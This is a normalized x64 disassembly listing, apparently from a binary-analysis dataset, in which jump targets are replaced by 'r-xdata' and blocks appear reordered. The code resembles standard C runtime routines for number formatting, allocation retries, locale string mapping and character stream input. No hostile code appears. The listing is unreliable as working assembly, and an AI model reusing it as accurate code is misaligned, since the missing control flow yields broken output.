add rsp 0x20
pop rdi
retn
lea eax [ r9 - 0x2 ]
mov ebx 0x22
cmp eax ebx
ja r-xdata
call sub_14003f1a4
mov ebx 0x22
jmp r-xdata
xor ecx ecx
mov r8 r10
test edx edx
je r-xdata
mov [ rax ] ebx
call sub_140043760
mov eax ebx
jmp r-xdata
mov r9 r8
mov [ r10 ] 0x2d
lea r8 [ r10 + 0x1 ]
lea ecx [ rbx - 0x21 ]
neg edi
add dl 0x30
add dl 0x57
jmp r-xdata
cmp rcx r11
jb r-xdata
cmp rcx r11
jb r-xdata
mov [ r8 ] dl
inc rcx
inc r8
test eax eax
je r-xdata
mov [ r8 ] 0x0
dec r8
mov [ r10 ] 0x0
call sub_14003f1a4
jmp r-xdata
xor edx edx
mov eax edi
div esi
mov edi eax
cmp edx 0x9
jbe r-xdata
mov al [ r9 ]
mov cl [ r8 ]
mov [ r8 ] al
mov [ r9 ] cl
inc r9
dec r8
cmp r9 r8
jb r-xdata
xor eax eax
sub_140041578
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov esi r9d
mov r11 r8
mov r10 rdx
mov rdi rcx
test rdx rdx
jne r-xdata
test r8 r8
je r-xdata
call sub_14003f1a4
mov ebx 0x16
mov [ rdx ] 0x0
mov edx [ rsp + 0x50 ]
mov eax edx
neg eax
sbb rcx rcx
neg rcx
inc rcx
cmp r8 rcx
ja r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea eax [ rsi - 0x2 ]
mov ebx 0x22
cmp eax ebx
ja r-xdata
call sub_14003f1a4
mov ebx 0x22
jmp r-xdata
xor ecx ecx
mov r8 r10
test edx edx
je r-xdata
mov [ rax ] ebx
call sub_140043760
mov eax ebx
jmp r-xdata
mov r9 r8
mov [ r10 ] 0x2d
lea r8 [ r10 + 0x1 ]
lea ecx [ rbx - 0x21 ]
neg rdi
add dl 0x30
add dl 0x57
jmp r-xdata
cmp rcx r11
jb r-xdata
cmp rcx r11
jb r-xdata
mov [ r8 ] dl
inc rcx
inc r8
test rax rax
je r-xdata
mov [ r8 ] 0x0
dec r8
mov [ r10 ] 0x0
call sub_14003f1a4
jmp r-xdata
xor edx edx
mov rax rdi
div rsi
mov rdi rax
cmp edx 0x9
jbe r-xdata
mov al [ r9 ]
mov cl [ r8 ]
mov [ r8 ] al
mov [ r9 ] cl
inc r9
dec r8
cmp r9 r8
jb r-xdata
xor eax eax
sub_140041684
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov edi [ rw-data ]
xor ebp ebp
mov rsi rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
test edi edi
je r-xdata
mov ecx ebp
call [ Sleep@IAT ]
mov edi [ rw-data ]
lea r11d [ rbp + 0x3e8 ]
cmp r11d edi
mov ebp r11d
cmova ebp r12d
cmp ebp r12d
jne r-xdata
mov rcx rsi
call sub_14003ae78
mov rbx rax
test rax rax
jne r-xdata
sub_140041704
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor edi edi
mov rsi rdx
mov rbp rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
cmp [ rw-data ] eax
jbe r-xdata
mov ecx edi
call [ Sleep@IAT ]
lea r11d [ rdi + 0x3e8 ]
cmp r11d [ rw-data ]
mov edi r11d
cmova edi r12d
cmp edi r12d
jne r-xdata
xor r8d r8d
mov rdx rsi
mov rcx rbp
call sub_14004f8b4
mov rbx rax
test rax rax
jne r-xdata
sub_140041788
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor esi esi
mov rdi rdx
mov rbp rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
test rdi rdi
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
mov ecx esi
call [ Sleep@IAT ]
lea r11d [ rsi + 0x3e8 ]
cmp r11d [ rw-data ]
mov esi r11d
cmova esi r12d
cmp esi r12d
jne r-xdata
mov rdx rdi
mov rcx rbp
call sub_14003e6d4
mov rbx rax
test rax rax
jne r-xdata
sub_140041810
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
xor esi esi
mov rdi r8
mov rbp rdx
or r13d 0xffffffff
mov r12 rcx
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rax rbx
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
test rdi rdi
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
mov ecx esi
call [ Sleep@IAT ]
lea r11d [ rsi + 0x3e8 ]
cmp r11d [ rw-data ]
mov esi r11d
cmova esi r13d
cmp esi r13d
jne r-xdata
mov r8 rdi
mov rdx rbp
mov rcx r12
call sub_14004f950
mov rbx rax
test rax rax
jne r-xdata
sub_140041898
sub rsp 0x28
call sub_140043c34
mov rcx [ rax + 0xc0 ]
cmp rcx [ rw-data ]
je r-xdata
mov rax [ rcx + 0x140 ]
add rsp 0x28
retn
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_140045f2c
mov rcx rax
sub_1400418d4
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x50
lea rbp [ rsp + 0x40 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x8 ] rax
mov ebx [ rbp + 0x60 ]
xor edi edi
mov r14 r9
mov r15d r8d
mov [ rbp ] edx
test ebx ebx
jle r-xdata
mov r12d [ rbp + 0x78 ]
mov esi edi
test r12d r12d
jne r-xdata
mov r10d ebx
mov rax r9
neg [ rbp + 0x80 ]
mov r9d ebx
mov r8 r14
sbb edx edx
mov ecx r12d
mov [ rsp + 0x28 ] edi
and edx 0x8
mov [ rsp + 0x20 ] rdi
inc edx
call [ MultiByteToWideChar@IAT ]
movsxd r13 eax
test eax eax
jne r-xdata
mov rax [ rcx ]
mov r12d [ rax + 0x4 ]
mov eax ebx
sub eax r10d
dec eax
cmp eax ebx
lea ebx [ rax + 0x1 ]
jl r-xdata
inc rax
test r10d r10d
jne r-xdata
mov r8 0xffffffffffffff0
test eax eax
jle r-xdata
xor eax eax
jmp r-xdata
mov ebx eax
dec r10d
cmp [ rax ] dil
je r-xdata
or r10d 0xffffffff
test rdi rdi
je r-xdata
xor edx edx
lea rax [ rdx - 0x20 ]
div r13
cmp rax 0x2
jb r-xdata
mov rcx [ rbp + 0x8 ]
xor rcx rbp
call sub_14003a6a0
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov r9d ebx
mov r8 r14
mov edx 0x1
mov ecx r12d
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] rdi
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea rcx [ r13 + r13 + 0x10 ]
cmp rcx 0x400
ja r-xdata
lea rcx [ rdi - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov r14d [ rbp ]
and [ rsp + 0x28 ] esi
and [ rsp + 0x20 ] rsi
mov ecx r14d
mov r9d r13d
mov r8 rdi
mov edx r15d
call [ LCMapStringW@IAT ]
movsxd rsi eax
test eax eax
je r-xdata
call sub_14003ae78
mov rdi rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax esi
call sub_14003ad04
mov r8d 0x400
test r8d r15d
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_14003d700
sub rsp rax
lea rdi [ rsp + 0x40 ]
test rdi rdi
je r-xdata
mov rax r8
test eax eax
jle r-xdata
mov ecx [ rbp + 0x70 ]
test ecx ecx
je r-xdata
mov [ rdi ] 0xcccc
jmp r-xdata
xor ebx ebx
xor edx edx
lea rax [ rdx - 0x20 ]
div rsi
cmp rax 0x2
jb r-xdata
cmp esi ecx
jg r-xdata
add rdi 0x10
mov r9d r13d
mov r8 rdi
mov edx r15d
mov ecx r14d
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] rbx
call [ LCMapStringW@IAT ]
xor ecx ecx
test eax eax
je r-xdata
lea rcx [ rsi + rsi + 0x10 ]
cmp rcx r8
ja r-xdata
mov rax [ rbp + 0x68 ]
mov [ rsp + 0x28 ] ecx
mov r9d r13d
mov r8 rdi
mov edx r15d
mov ecx r14d
mov [ rsp + 0x20 ] rax
call [ LCMapStringW@IAT ]
jmp r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov eax [ rbp + 0x70 ]
xor edx edx
mov [ rsp + 0x38 ] rcx
mov r9d esi
mov r8 rbx
mov [ rsp + 0x30 ] rcx
test eax eax
jne r-xdata
call sub_14003ae78
mov rbx rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
call sub_14003ad04
mov [ rsp + 0x28 ] eax
mov rax [ rbp + 0x68 ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x28 ] ecx
mov [ rsp + 0x20 ] rcx
jmp r-xdata
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_14003d700
sub rsp rax
lea rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
mov ecx r12d
call [ WideCharToMultiByte@IAT ]
mov esi eax
mov [ rbx ] 0xcccc
jmp r-xdata
add rbx 0x10
jmp r-xdata
sub_140041ba0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x70
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x50 ]
mov rbx r9
mov edi r8d
call sub_14003b928
mov eax [ rsp + 0xb8 ]
mov r11d [ rsp + 0xc0 ]
lea rcx [ rsp + 0x50 ]
mov [ rsp + 0x40 ] r11d
mov [ rsp + 0x38 ] eax
mov eax [ rsp + 0xb0 ]
mov [ rsp + 0x30 ] eax
mov rax [ rsp + 0xa8 ]
mov r9 rbx
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0xa0 ]
mov r8d edi
mov edx esi
mov [ rsp + 0x20 ] eax
call sub_1400418d4
cmp [ rsp + 0x68 ] 0x0
je r-xdata
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
pop rdi
retn
mov rcx [ rsp + 0x60 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_140041c38
mov [ rsp + 0x18 ] rbx
push rsi
push rdi
push r12
sub rsp 0x20
test [ rcx + 0x18 ] 0x40
mov rdi rcx
lea r12 [ rw-data ]
lea rsi [ rw-data ]
jne r-xdata
test [ rdi + 0x18 ] 0x40
jne r-xdata
call sub_14003be60
cmp eax 0xffffffff
je r-xdata
movsxd rax [ rdi + 0x8 ]
add rax 0xfffffffffffffffe
mov [ rdi + 0x8 ] eax
test eax eax
js r-xdata
mov rcx rdi
call sub_14003be60
cmp eax 0xffffffff
je r-xdata
mov r11 rsi
mov rcx rdi
call sub_14003be60
cmp eax 0xfffffffe
je r-xdata
mov rcx rdi
call sub_14004f9d8
mov rcx [ rdi ]
movzx eax [ rcx ]
add rcx 0x2
mov [ rdi ] rcx
jmp r-xdata
test [ rsi + 0x8 ] 0x80
je r-xdata
mov rcx rdi
call sub_14003be60
cmp eax 0xfffffffe
je r-xdata
dec [ rdi + 0x8 ]
js r-xdata
mov rcx rdi
call sub_14003be60
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_14003be60
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ r12 + rbx * 8 ]
jmp r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
dec [ rdi + 0x8 ]
mov ebx 0x1
js r-xdata
mov rcx rdi
call sub_14003be60
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_14003be60
mov esi eax
and esi 0x1f
imul rsi rsi 0x58
add rsi [ r12 + rbx * 8 ]
mov rcx rdi
call sub_140043e10
mov ecx eax
mov rax [ rdi ]
movzx ecx [ rax ]
inc rax
mov [ rdi ] rax
jmp r-xdata
test [ r11 + 0x38 ] 0x7f
je r-xdata
mov rcx rdi
call sub_140043e10
mov ecx eax
mov rax [ rdi ]
movzx ecx [ rax ]
inc rax
mov [ rdi ] rax
jmp r-xdata
dec [ rdi + 0x8 ]
mov [ rsp + 0x40 ] cl
js r-xdata
mov eax 0xffff
jmp r-xdata
cmp ecx 0xffffffff
jne r-xdata
mov [ rsp + 0x48 ] cl
movzx ecx cl
call sub_14004fd00
test eax eax
je r-xdata
cmp ecx 0xffffffff
je r-xdata
mov rcx rdi
call sub_140043e10
mov ecx eax
mov rax [ rdi ]
movzx ecx [ rax ]
inc rax
mov [ rdi ] rax
jmp r-xdata
lea rdx [ rsp + 0x48 ]
lea rcx [ rsp + 0x40 ]
movsxd r8 ebx
call sub_14004fcb0
cmp eax 0xffffffff
jne r-xdata
dec [ rdi + 0x8 ]
js r-xdata
mov [ rsp + 0x41 ] cl
cmp ecx 0xffffffff
je r-xdata
movzx eax [ rsp + 0x40 ]
jmp r-xdata
call sub_14003f1a4
mov [ rax ] 0x2a
jmp r-xdata
mov rcx rdi
call sub_140043e10
mov ecx eax
mov rax [ rdi ]
movzx ecx [ rax ]
inc rax
mov [ rdi ] rax
jmp r-xdata
mov [ rsp + 0x49 ] cl
mov ebx 0x2
movsx ecx [ rsp + 0x48 ]
mov rdx rdi
call sub_140042610
jmp r-xdata
cmp ecx 0xffffffff
jne r-xdata
sub_140041e34
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x20
mov rbx rcx
xor eax eax
test rcx rcx
setne al
test eax eax
jne r-xdata
call sub_14003bd5c
nop
mov rcx rbx
call sub_140041c38
movzx edi ax
mov rcx rbx
call sub_14003bdf4
movzx eax di
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
mov eax 0xffff
jmp r-xdata
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_140041e90
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rbp
push rsi
push rdi
push r12
sub rsp 0x40
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x30 ] rax
test [ rdx + 0x18 ] 0x40
mov rdi rdx
movzx esi cx
jne r-xdata
movsxd rax [ rdi + 0x8 ]
add rax 0xfffffffffffffffe
mov [ rdi + 0x8 ] eax
test eax eax
js r-xdata
mov rcx rdx
call sub_14003be60
lea rbp [ rw-data ]
lea r12 [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov rdx rdi
movzx ecx si
call sub_14004fd48
mov rax [ rdi ]
mov [ rax ] si
mov r11 rbp
mov rcx rdi
call sub_14003be60
cmp eax 0xfffffffe
je r-xdata
mov rcx [ rsp + 0x30 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x70 ]
mov rbp [ rsp + 0x78 ]
add rsp 0x40
pop r12
pop rdi
pop rsi
retn
movsxd rcx [ rdi + 0x8 ]
add rcx 0xfffffffffffffffe
mov [ rdi + 0x8 ] ecx
test ecx ecx
js r-xdata
mov rcx rdi
call sub_14003be60
cmp eax 0xffffffff
je r-xdata
mov rcx rdi
call sub_14003be60
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_14003be60
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ r12 + rbx * 8 ]
jmp r-xdata
mov rcx [ rdi ]
mov [ rcx ] si
jmp r-xdata
mov r11 rbp
mov rcx rdi
call sub_14003be60
cmp eax 0xfffffffe
je r-xdata
mov al [ r11 + 0x38 ]
and al 0x7f
cmp al 0x2
je r-xdata
add [ rdi ] 0x2
movzx eax si
jmp r-xdata
mov rcx rdi
call sub_14003be60
cmp eax 0xffffffff
je r-xdata
mov rcx rdi
call sub_14003be60
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_14003be60
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ r12 + rbx * 8 ]
jmp r-xdata
test [ rbp + 0x8 ] 0x80
je r-xdata
mov rcx rdi
call sub_14003be60
cmp eax 0xfffffffe
je r-xdata
mov al [ r11 + 0x38 ]
and al 0x7f
cmp al 0x1
je r-xdata
lea rdx [ rsp + 0x24 ]
lea rcx [ rsp + 0x20 ]
movzx r9d si
mov r8d 0x5
call sub_14005009c
xor ebx ebx
test eax eax
je r-xdata
mov rcx rdi
call sub_14003be60
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_14003be60
mov ebp eax
and ebp 0x1f
imul rbp rbp 0x58
add rbp [ r12 + rbx * 8 ]
cmp [ rsp + 0x20 ] ebx
jle r-xdata
mov eax 0xffff
jmp r-xdata
movzx eax si
jmp r-xdata
lea rbp [ rsp + 0x24 ]
movsx ecx [ rbp ]
mov rdx rdi
call sub_140044da8
mov ecx eax
mov rcx [ rdi ]
mov al [ rbp ]
mov [ rcx ] al
mov rax [ rdi ]
movzx ecx [ rax ]
inc rax
mov [ rdi ] rax
jmp r-xdata
inc ebx
inc rbp
cmp ebx [ rsp + 0x20 ]
jl r-xdata
cmp ecx 0xffffffff
je r-xdata
dec [ rdi + 0x8 ]
js r-xdata
sub_140042090
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x20
mov rbx rdx
movzx edi cx
xor eax eax
test rdx rdx
setne al
test eax eax
jne r-xdata
mov rcx rdx
call sub_14003bd5c
nop
mov rdx rbx
movzx ecx di
call sub_140041e90
movzx edi ax
mov rcx rbx
call sub_14003bdf4
movzx eax di
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
mov eax 0xffff
jmp r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_1400420f8
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rbp
push rsi
push rdi
push r12
push r13
push r15
sub rsp 0x40
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x30 ] rax
mov r13d 0xffff
mov rdi rdx
movzx ebp cx
mov [ rsp + 0x24 ] cx
cmp cx r13w
je r-xdata
movzx eax r13w
test [ rdx + 0x18 ] 0x1
mov esi 0x2
jne r-xdata
cmp [ rdx + 0x10 ] 0x0
jne r-xdata
test [ rdx + 0x18 ] 0x80
je r-xdata
test [ rdi + 0x18 ] 0x40
jne r-xdata
mov rcx rdx
call sub_1400500b0
test [ rdx + 0x18 ] sil
jne r-xdata
mov rax [ rdi + 0x10 ]
add rax rsi
cmp [ rdi ] rax
jae r-xdata
mov rcx rdi
call sub_14003be60
lea r12 [ rw-data ]
lea r15 [ rw-data ]
cmp eax 0xffffffff
je r-xdata
add [ rdi ] 0xfffffffffffffffe
test [ rdi + 0x18 ] 0x40
mov rax [ rdi ]
je r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov r11 r12
mov rcx rdi
call sub_14003be60
cmp eax 0xfffffffe
je r-xdata
mov [ rax ] bp
jmp r-xdata
cmp [ rax ] bp
je r-xdata
cmp [ rdi + 0x24 ] esi
jb r-xdata
mov rcx rdi
call sub_14003be60
cmp eax 0xffffffff
je r-xdata
mov rcx rdi
call sub_14003be60
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_14003be60
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ r15 + rbx * 8 ]
jmp r-xdata
add [ rdi + 0x8 ] esi
and [ rdi + 0x18 ] 0xffffffef
or [ rdi + 0x18 ] 0x1
movzx eax bp
jmp r-xdata
add rax rsi
mov [ rdi ] rax
mov [ rdi ] rax
test [ r12 + 0x38 ] 0x7f
je r-xdata
mov rcx rdi
call sub_14003be60
cmp eax 0xfffffffe
je r-xdata
test [ r11 + 0x8 ] 0x80
je r-xdata
mov rcx [ rsp + 0x30 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x40 ]
mov rbp [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r13
pop r12
pop rdi
pop rsi
retn
lea rdx [ rsp + 0x28 ]
lea rcx [ rsp + 0x20 ]
movzx r9d bp
mov r8d 0x5
call sub_14005009c
test eax eax
jne r-xdata
mov al [ rsp + 0x25 ]
mov [ rsp + 0x28 ] bpl
mov [ rsp + 0x20 ] esi
mov [ rsp + 0x29 ] al
jmp r-xdata
mov rcx rdi
call sub_14003be60
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_14003be60
mov r12d eax
and r12d 0x1f
imul r12 r12 0x58
add r12 [ r15 + rbx * 8 ]
mov esi [ rsp + 0x20 ]
mov rax [ rdi + 0x10 ]
movsxd rdx esi
add rdx rax
cmp [ rdi ] rdx
jae r-xdata
lea eax [ rsi - 0x1 ]
movsxd rdx eax
test eax eax
js r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
dec [ rdi ]
mov al [ rsp + rdx + 0x28 ]
dec rdx
mov rcx [ rdi ]
mov [ rcx ] al
jns r-xdata
cmp esi [ rdi + 0x24 ]
jg r-xdata
mov esi [ rsp + 0x20 ]
mov [ rdi ] rdx
sub_1400422fc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x20
mov rbx rdx
movzx edi cx
xor eax eax
test rdx rdx
setne al
test eax eax
jne r-xdata
mov rcx rdx
call sub_14003bd5c
nop
mov rdx rbx
movzx ecx di
call sub_1400420f8
movzx edi ax
mov rcx rbx
call sub_14003bdf4
movzx eax di
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
mov eax 0xffff
jmp r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_140042364
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x8 ] rcx
push rdi
push r12
push r13
sub rsp 0x20
mov rsi r9
mov r12d r8d
mov r13 rdx
mov rbx rcx
xor edi edi
mov eax edi
test rcx rcx
setne al
test eax eax
jne r-xdata
cmp r8d 0x4
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
or eax 0xffffffff
jmp r-xdata
test r8d r8d
je r-xdata
test r8d r8d
je r-xdata
mov rbx [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
lea rax [ r9 - 0x2 ]
cmp rax 0x7ffffffd
ja r-xdata
cmp r8d 0x40
jne r-xdata
cmp r8d 0x40
jne r-xdata
and rsi 0xfffffffffffffffe
call sub_14003bd5c
nop
mov rcx rbx
call sub_14003ed0c
mov rcx rbx
call sub_140044d70
and [ rbx + 0x18 ] 0xffffc2f3
mov eax [ rbx + 0x18 ]
test r12b 0x4
je r-xdata
test r13 r13
jne r-xdata
or eax 0x4
mov [ rbx + 0x18 ] eax
lea r13 [ rbx + 0x20 ]
mov esi 0x2
mov [ rsp + 0x58 ] rsi
jmp r-xdata
or eax 0x500
mov [ rbx + 0x18 ] eax
mov rcx rsi
call sub_140041684
mov r13 rax
test rax rax
jne r-xdata
mov [ rbx + 0x24 ] esi
mov [ rbx + 0x10 ] r13
mov [ rbx ] r13
mov [ rbx + 0x8 ] edi
or [ rbx + 0x18 ] 0x408
jmp r-xdata
inc [ rw-data ]
or edi 0xffffffff
jmp r-xdata
mov rcx rbx
call sub_14003bdf4
mov eax edi
sub_140042474
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov rbx [ r9 + 0x38 ]
mov rsi rdx
mov r12 r8
mov rbp rcx
lea r8 [ rbx + 0x4 ]
mov rdx r9
mov rcx rsi
mov rdi r9
call sub_14003dac8
mov r11d [ rbx + 0x4 ]
mov r10d [ rbp + 0x4 ]
mov eax r11d
and r11d 0x2
mov r8d 0x1
and eax r8d
and r10b 0x66
cmove r11d eax
test r11d r11d
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov eax r8d
add rsp 0x20
pop r12
retn
mov r9 rdi
mov r8 r12
mov rdx rsi
mov rcx rbp
call sub_14003fa98
mov r8d eax
sub_140042504
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
test [ rdx + 0x18 ] 0x40
mov rbx rdx
mov edi ecx
jne r-xdata
cmp edi 0xffffffff
je r-xdata
mov rcx rdx
call sub_14003be60
lea rdx [ rw-data ]
lea r8 [ rw-data ]
movsxd r11 eax
cmp r11d 0xffffffff
je r-xdata
or eax 0xffffffff
test [ rbx + 0x18 ] 0x1
jne r-xdata
mov rcx rdx
cmp r11d 0xfffffffe
je r-xdata
cmp [ rbx + 0x10 ] 0x0
jne r-xdata
test [ rbx + 0x18 ] 0x80
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
cmp r11d 0xffffffff
je r-xdata
mov rcx r11
mov rax r11
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
add rcx [ r8 + rax * 8 ]
jmp r-xdata
mov rax [ rbx ]
cmp rax [ rbx + 0x10 ]
jne r-xdata
mov rcx rbx
call sub_1400500b0
test [ rbx + 0x18 ] 0x2
jne r-xdata
test [ rdx + 0x38 ] 0x80
je r-xdata
cmp r11d 0xfffffffe
je r-xdata
test [ rcx + 0x38 ] 0x7f
jne r-xdata
dec [ rbx ]
test [ rbx + 0x18 ] 0x40
mov rax [ rbx ]
je r-xdata
cmp [ rbx + 0x8 ] 0x0
jne r-xdata
mov rdx r11
mov rax r11
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
add rdx [ r8 + rax * 8 ]
mov [ rax ] dil
cmp [ rax ] dil
je r-xdata
inc rax
mov [ rbx ] rax
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
inc [ rbx + 0x8 ]
and [ rbx + 0x18 ] 0xffffffef
or [ rbx + 0x18 ] 0x1
movzx eax dil
jmp r-xdata
inc rax
mov [ rbx ] rax
jmp r-xdata
sub_140042610
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x20
mov rbx rdx
mov edi ecx
xor eax eax
test rdx rdx
setne al
test eax eax
jne r-xdata
mov rcx rdx
call sub_14003bd5c
nop
mov rdx rbx
mov ecx edi
call sub_140042504
mov edi eax
mov rcx rbx
call sub_14003bdf4
mov eax edi
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
or eax 0xffffffff
jmp r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_140042670
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x20
mov rbx rcx
xor edi edi
xor eax eax
test rcx rcx
setne al
test eax eax
jne r-xdata
call sub_14003bd5c
nop
test [ rbx + 0x18 ] 0x40
jne r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
or eax 0xffffffff
jmp r-xdata
test edi edi
jne r-xdata
mov rcx rbx
call sub_14003be60
cmp eax 0xffffffff
je r-xdata
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call sub_14003bdf4
mov eax edi
dec [ rbx + 0x8 ]
js r-xdata
lea rcx [ rw-data ]
mov rdx rcx
lea r8 [ rw-data ]
cmp eax 0xfffffffe
je r-xdata
mov rcx rbx
call sub_140043e10
mov edi eax
mov rax [ rbx ]
movzx edi [ rax ]
inc rax
mov [ rbx ] rax
jmp r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
or edi 0xffffffff
cmp eax 0xffffffff
je r-xdata
movsxd rdx eax
mov rcx rdx
sar rcx 0x5
lea r8 [ rw-data ]
and edx 0x1f
imul rdx rdx 0x58
add rdx [ r8 + rcx * 8 ]
lea rcx [ rw-data ]
jmp r-xdata
test [ rcx + 0x38 ] 0x80
je r-xdata
cmp eax 0xfffffffe
je r-xdata
test [ rdx + 0x38 ] 0x7f
jne r-xdata
movsxd rcx eax
mov rax rcx
sar rax 0x5
and ecx 0x1f
imul rcx rcx 0x58
add rcx [ r8 + rax * 8 ]
sub_140042774
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
xor ebx ebx
mov rdi rdx
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
or eax 0xffffffff
jmp r-xdata
call sub_1400503f4
